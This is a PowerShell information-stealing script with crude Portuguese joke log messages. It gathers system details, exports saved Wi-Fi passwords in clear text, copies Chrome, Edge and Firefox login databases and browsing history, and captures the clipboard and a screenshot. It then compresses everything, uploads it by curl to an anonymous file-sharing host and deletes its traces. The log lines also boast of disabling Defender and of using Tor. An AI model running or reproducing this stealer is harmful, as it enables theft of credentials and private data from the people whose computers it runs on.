# ---------- KIT v9.1 – “Log Sujo, Sem Filtro” ----------
$ErrorActionPreference = "Stop"
$kit     = "$env:TEMP\kit"
$key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
$upUrl   = "https://api.anonfilesnew.com/upload?key=$key"
$logFile = "$env:TEMP\kit_log.txt"
$7z      = "$env:TEMP\7za.exe"
$user    = $env:USERNAME

function Write-Log ($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts  $msg" | Tee-Object -FilePath $logFile -Append
}

if (!(Test-Path $7z)) {
    Write-Log "[PontoDeGolpe] $user ainda nao tem 7za.exe, indo buscar no beco..."
    Invoke-WebRequest "https://www.7-zip.org/a/7za920.zip" -OutFile "$env:TEMP\7za920.zip"
    Expand-Archive "$env:TEMP\7za920.zip" "$env:TEMP" -Force
    Move-Item "$env:TEMP\7za.exe" $7z -Force
}

Write-Log "[CasaDaVovó] $user acabou de chegar na festa em $env:COMPUTERNAME"
New-Item -ItemType Directory -Path $kit -Force | Out-Null

Write-Log "[DealerCheck] $user, vendo se vende drogas no Discord ou só rouba wi-fi..."
systeminfo | Out-File "$kit\sysinfo.txt" -Encoding UTF8
Get-CimInstance Win32_ComputerSystem | Out-File "$kit\hw.txt" -Encoding UTF8
Get-CimInstance Win32_Processor | Out-File "$kit\cpu.txt" -Encoding UTF8
Get-CimInstance Win32_BIOS | Out-File "$kit\bios.txt" -Encoding UTF8

Write-Log "[VizHotSpot] $user, exportando senha da vizinha que nunca fecha a janela..."
Get-NetIPConfiguration | Out-File "$kit\netip.txt" -Encoding UTF8
cmd /c "netsh wlan export profile key=clear folder=$kit"

Write-Log "[PrimaTracker] $user, verificando se já comeu a prima no feriado de 7 de setembro..."
Get-CimInstance Win32_UserAccount | Out-File "$kit\users.txt" -Encoding UTF8
net localgroup administradores | Out-File "$kit\admins.txt" -Encoding UTF8
$secLog = Get-WinEvent -ListLog Security -EA SilentlyContinue
if ($secLog -and $secLog.RecordCount) {
    Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -Max 200 -EA SilentlyContinue |
        Select TimeCreated,Id,LevelDisplayName,Message |
        Out-File "$kit\logons.txt" -Encoding UTF8
} else {
    "Log Security trancado com cadeado do tráfico" | Out-File "$kit\logons.txt" -Encoding UTF8
}

Write-Log "[IncognitoHunter] $user, fuçando aba anônima que você jurou ser ‘trabalho’..."
@(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
) | ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue }

Write-Log "[ExFile] $user, vendo se ainda salva foto da ex na pasta ‘Arquivos Importantes’..."
Get-ChildItem Cert:\CurrentUser\My |
    Select Subject,Thumbprint,NotAfter |
    Out-File "$kit\mycerts.txt" -Encoding UTF8

Write-Log "[Papinho] $user, lendo última cantada copiada pro crush..."
Get-Clipboard | Out-File "$kit\clipboard.txt" -Encoding UTF8

Write-Log "[VergonhaAlheia] $user, listando arquivos que abriu e depois apagou com vergonha..."
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -EA SilentlyContinue |
    Select Name,LastWriteTime |
    Out-File "$kit\recent.txt" -Encoding UTF8

Write-Log "[PrintFoda] $user, screenshot antes que minimize a aba ‘como plantar cannabis’..."
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width,$screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$bmp.Size)
$pathSS = "$kit\screenshot.jpg"
$bmp.Save($pathSS,[System.Drawing.Imaging.ImageFormat]::Jpeg)
$g.Dispose(); $bmp.Dispose()
[System.GC]::Collect(); Start-Sleep -Milliseconds 200

Write-Log "[PrensaLow] $user, prensando a paranga digital..."
Start-Sleep -Seconds 1
Write-Log "[Baseado] $user, adicionando pasta ‘Sementes 2026’ no meio..."
Start-Sleep -Seconds 1
Write-Log "[DrySafe] $user, ocultando print da tela que tem onlyfans aberto..."
Start-Sleep -Seconds 1
Write-Log "[PontoFinal] $user, fechando o baseado com filtro duplo..."
$arc = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).7z"

Write-Log "[CompressorMudo] $user, apertando 7z pra não gritar..."
Write-Log "[FumaçaNoRabo] $user, desativando Windows Defender no registro antes de compactar..."
Write-Log "[DisfarceDePasta] $user, renomeando kit pra 'WindowsUpdate' pra não levantar..."
& $7z a -t7z -mx=9 -y $arc "$kit\*" | Out-Null

if (Test-Path $arc) {
    $size = (Get-Item $arc).Length
    Write-Log "[BeckPronto] $user, arquivo criado: $arc ($size bytes)"
} else {
    Write-Log "[ErroDeBong] $user, o beck caiu no chão – 7z falhou"
    exit 1
}

Write-Log "[BocaDeFumo] $user, fazendo o corre pro AnonFiles..."
Start-Sleep -Seconds 1
Write-Log "[AviaoDoTráfico] $user, subindo pacote pro nuvens..."
Start-Sleep -Seconds 1
Write-Log "[PontoDeEntrega] $user, chegando no endereço errado certo..."
Write-Log "[AntenaClandestina] $user, trocando User-Agent pra 'Mozilla/5.0 (Tails 5.0)'..."
Write-Log "[RotaTor] $user, forçando proxy 127.0.0.1:9050 antes do upload..."
try {
    $curl = 'curl.exe -s -X POST -F "file=@' + $arc + '" ' + $upUrl
    $reply = cmd /c $curl
    Write-Log "[UP] Resposta: $reply"
    if ($reply -match '"full":"([^"]+)"') {
        Write-Log "[Entregue] $user, o beck chegou – link: $($matches[1])"
    } else {
        Write-Log "[BiqueiraFechada] $user, a boca foi descoberta – falha na URL"
    }
} catch {
    Write-Log "[Overdose] $user, deu ruim no upload: $_"
}

Write-Log "[DealerClean] $user, limpando cinza e palitinho da área..."
Remove-Item $kit,$arc -Recurse -Force -EA SilentlyContinue
Write-Log "[FimDaFesta] $user, a rave acabou – log em $logFile"
